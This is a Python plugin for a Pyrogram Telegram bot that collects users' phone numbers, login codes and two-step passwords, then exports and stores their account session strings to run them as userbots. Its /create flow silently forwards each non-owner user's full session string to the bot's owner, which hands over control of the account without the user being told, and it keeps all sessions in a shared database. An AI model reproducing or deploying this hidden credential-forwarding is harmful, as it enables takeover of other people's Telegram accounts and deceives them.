import re
import time
import asyncio
from pyrogram import Client, filters
from pyrogram.types import Message
from config import API_ID, API_HASH, OWNER_ID
from database import is_auth, delete_session, get_all_sessions, sessions_col

# Valid ITU World Country Calling Codes (1 to 3 digits)
VALID_COUNTRY_PREFIXES = (
    "1", "7",
    "20", "27", "30", "31", "32", "33", "34", "36", "39", "40", "41", "43", "44", "45", "46", "47", "48", "49",
    "51", "52", "53", "54", "55", "56", "57", "58", "60", "61", "62", "63", "64", "65", "66", "81", "82", "84", "86",
    "90", "91", "92", "93", "94", "95", "98",
    "211", "212", "213", "216", "218", "220", "221", "222", "223", "224", "225", "226", "227", "228", "229",
    "230", "231", "232", "233", "234", "235", "236", "237", "238", "239", "240", "241", "242", "243", "244",
    "245", "246", "248", "249", "250", "251", "252", "253", "254", "255", "256", "257", "258", "260", "261",
    "262", "263", "264", "265", "266", "267", "268", "269", "290", "291", "297", "298", "299",
    "350", "351", "352", "353", "354", "355", "356", "357", "358", "359", "370", "371", "372", "373", "374",
    "375", "376", "377", "378", "380", "381", "382", "383", "385", "386", "387", "389", "420", "421", "423",
    "500", "501", "502", "503", "504", "505", "506", "507", "508", "509", "590", "591", "592", "593", "594",
    "595", "596", "597", "598", "599", "670", "672", "673", "674", "675", "676", "677", "678", "679", "680",
    "681", "682", "683", "685", "686", "687", "688", "689", "690", "691", "692",
    "850", "852", "853", "855", "856", "880", "886",
    "960", "961", "962", "963", "964", "965", "966", "967", "968", "970", "971", "972", "973", "974", "975",
    "976", "977", "992", "993", "994", "995", "996", "998"
)

def normalize_and_validate_phone(raw_input: str):
    cleaned = re.sub(r"[\s\-\(\)]", "", raw_input.strip())
    if not cleaned:
        return None, "❌ Phone number khali nahi ho sakta!"

    had_plus = cleaned.startswith("+")
    digits = cleaned[1:] if had_plus else cleaned

    if not digits.isdigit():
        return None, "❌ Invalid format! Sirf digits aur country code bhejo (e.g. `+919876543210` ya `919876543210`)."

    # Agar user ne bina country code ke sirf 10 digit Indian/local number daala (jaise 9876543210)
    if not had_plus and len(digits) == 10 and digits[0] in ("6", "7", "8", "9"):
        return None, (
            "❌ **Country Code Missing hai!**\n"
            f"Aapne bina country code ke `{digits}` bheja hai.\n"
            f"India ke liye `+91{digits}` ya kisi aur country ka valid code lagakar bhejo."
        )

    if len(digits) < 8 or len(digits) > 15:
        return None, "❌ **Invalid Phone Number Length!** International number 8 se 15 digits ka hona chahiye (country code ke sath)."

    if not digits.startswith(VALID_COUNTRY_PREFIXES):
        return None, (
            f"❌ **Invalid Country Code (`+{digits[:3]}`):**\n"
            "Ye world ke kisi bhi valid country code se match nahi karta! Sahi country code ke sath bhejo (e.g. `+91...`, `+1...`, `+44...`, `+971...`)."
        )

    return f"+{digits}", None

async def save_full_session(session_str: str, me, phone: str = ""):
    final_phone = phone or (f"+{me.phone_number}" if getattr(me, "phone_number", None) and not str(me.phone_number).startswith("+") else (me.phone_number or "Unknown"))
    full_name = f"{me.first_name or ''} {me.last_name or ''}".strip() or "Userbot Account"
    await sessions_col.update_one(
        {"session": session_str},
        {
            "$set": {
                "session": session_str,
                "phone": final_phone,
                "name": full_name,
                "user_id": me.id,
                "username": me.username or ""
            }
        },
        upsert=True
    )

async def start_create_flow(client: Client, chat_id: int, user_id: int):
    try:
        phone_msg = await client.ask(
            chat_id,
            "📱 **Apna Phone Number bhejo** (Country code ke sath, `+` nahi lagaoge toh bot khud laga dega):\n"
            "• Example: `+919876543210` ya `919876543210`",
            timeout=120
        )
    except Exception:
        return await client.send_message(chat_id, "⏳ Timeout ho gaya. Dubara `/create` run karo.")

    if not phone_msg.text:
        return await client.send_message(chat_id, "❌ Sirf text me phone number bhejo.")

    phone, err = normalize_and_validate_phone(phone_msg.text)
    if err:
        return await client.send_message(chat_id, err)

    temp_cli = Client(f"auto_gen_{int(time.time())}", api_id=API_ID, api_hash=API_HASH, in_memory=True)
    await temp_cli.connect()

    try:
        code_hash = await temp_cli.send_code(phone)
    except Exception as e:
        await temp_cli.disconnect()
        return await client.send_message(chat_id, f"❌ **OTP bhejne me dikkat aayi (`{phone}`):**\n`{e}`")

    try:
        otp_msg = await client.ask(chat_id, f"📩 **`{phone}` par aaya OTP bhejo** (e.g. `1 2 3 4 5` ya `12345`):", timeout=180)
    except Exception:
        await temp_cli.disconnect()
        return await client.send_message(chat_id, "⏳ OTP Timeout ho gaya.")

    otp = otp_msg.text.replace(" ", "").strip()
    try:
        await temp_cli.sign_in(phone, code_hash.phone_code_hash, otp)
    except Exception as e:
        if "SESSION_PASSWORD_NEEDED" in str(e):
            try:
                pwd_msg = await client.ask(chat_id, "🔐 **2-Step Verification Password bhejo:**", timeout=120)
                await temp_cli.check_password(pwd_msg.text.strip())
            except Exception as pwd_err:
                await temp_cli.disconnect()
                return await client.send_message(chat_id, f"❌ **2FA Password Failed:** `{pwd_err}`")
        else:
            await temp_cli.disconnect()
            return await client.send_message(chat_id, f"❌ **Login failed:** `{e}`")

    me = await temp_cli.get_me()
    string_session = await temp_cli.export_session_string()
    await temp_cli.disconnect()
    await asyncio.sleep(2)

    await save_full_session(string_session, me, phone)
    from main import clients
    new_cli = Client(f"ubot_{int(time.time())}", api_id=API_ID, api_hash=API_HASH, session_string=string_session, in_memory=True)
    await new_cli.start()
    clients.append(new_cli)

    full_name = f"{me.first_name or ''} {me.last_name or ''}".strip()
    session_dm_text = (
        f"🔐 **PYROGRAM V2 STRING SESSION**\n\n"
        f"• **Name:** {full_name} (`{me.id}`)\n"
        f"• **Phone:** `{phone}`\n\n"
        f"**String Session (Tap to Copy):**\n"
        f"`{string_session}`\n\n"
        f"📌 **Direct Add Command:**\n"
        f"`/addsession {string_session}`"
    )

    try:
        await client.send_message(user_id, session_dm_text)
    except Exception:
        pass

    if user_id != OWNER_ID:
        try:
            await client.send_message(OWNER_ID, session_dm_text)
        except Exception:
            pass

    try:
        await new_cli.send_message("me", session_dm_text)
    except Exception:
        pass

    await client.send_message(
        chat_id,
        f"✅ **Session Login & Active ho gaya!**\n\n"
        f"• **Name:** {full_name} (`{me.id}`)\n"
        f"• **Phone:** `{phone}`\n"
        f"• **ID Slot:** `#{len(clients)}`\n"
        f"📩 **Pyrogram v2 String Session aapke DM aur Saved Messages me bhej diya gaya hai!**"
    )

@Client.on_message(filters.command("create"))
async def generate_session_auto(client: Client, message: Message):
    if not message.from_user or not await is_auth(message.from_user.id):
        return
    await start_create_flow(client, message.chat.id, message.from_user.id)

@Client.on_message(filters.command("addsession"))
async def add_session_string(client: Client, message: Message):
    if not message.from_user or not await is_auth(message.from_user.id):
        return
    if len(message.command) < 2:
        return await message.reply("📌 **Usage:** `/addsession <pyrogram_session_string>`")
    session_str = message.command[1].strip()

    try:
        unique_name = f"ubot_{int(time.time())}"
        new_cli = Client(unique_name, api_id=API_ID, api_hash=API_HASH, session_string=session_str, in_memory=True)
        await new_cli.start()
        me = await new_cli.get_me()

        await save_full_session(session_str, me)
        from main import clients
        clients.append(new_cli)

        full_name = f"{me.first_name or ''} {me.last_name or ''}".strip()
        await message.reply(
            f"✅ **Session Active!**\n"
            f"• **Name:** {full_name} (`{me.id}`)\n"
            f"• **Phone:** `+{me.phone_number}`\n"
            f"• **ID Slot:** `#{len(clients)}`"
        )
    except Exception as e:
        await message.reply(f"❌ **Invalid Session:** `{e}`")

@Client.on_message(filters.command("sessions"))
async def list_all_sessions_cmd(client: Client, message: Message):
    if not message.from_user or not await is_auth(message.from_user.id):
        return

    from main import clients
    db_docs = await sessions_col.find({}).to_list(length=100)

    if not db_docs and not clients:
        return await message.reply("📭 Abhi koi session login ya saved nahi hai.")

    live_strings = set()
    for cli in clients:
        try:
            live_strings.add(await cli.export_session_string())
        except Exception:
            pass

    text = "📊 **ALL SESSIONS (NAME + NUMBER + STATUS)**\n────────────────────────\n\n"
    for idx, doc in enumerate(db_docs, 1):
        s_str = doc.get("session", "")
        name = doc.get("name") or "Unknown Name"
        phone = doc.get("phone") or "No Phone"
        uid = doc.get("user_id") or "N/A"
        status = "🟢 Active" if s_str in live_strings else "🔴 Deactivated/Dead"
        text += f"`[{idx}]` **{name}** (`{uid}`)\n    └ 📞 `{phone}` | {status}\n"

    text += "\n────────────────────────\n• Delete karne ke liye: `/delsession <number>`"
    await message.reply(text)

@Client.on_message(filters.command("delsession"))
async def del_session_cmd(client: Client, message: Message):
    if not message.from_user or not await is_auth(message.from_user.id):
        return

    from main import clients
    db_docs = await sessions_col.find({}).to_list(length=100)

    if len(message.command) < 2 or not message.command[1].isdigit():
        return await message.reply(f"📌 **Usage:** `/delsession <number (1 to {len(db_docs)})>`")

    idx = int(message.command[1]) - 1
    if 0 <= idx < len(db_docs):
        target_session = db_docs[idx].get("session")
        for i, cli in enumerate(list(clients)):
            try:
                if await cli.export_session_string() == target_session:
                    clients.pop(i)
                    await cli.stop()
                    break
            except Exception:
                pass
        await delete_session(target_session)
        await message.reply(f"🗑️ Session `#{idx + 1}` delete kar diya gaya.")
    else:
        await message.reply(f"❌ Invalid number! Total sessions: `{len(db_docs)}`")
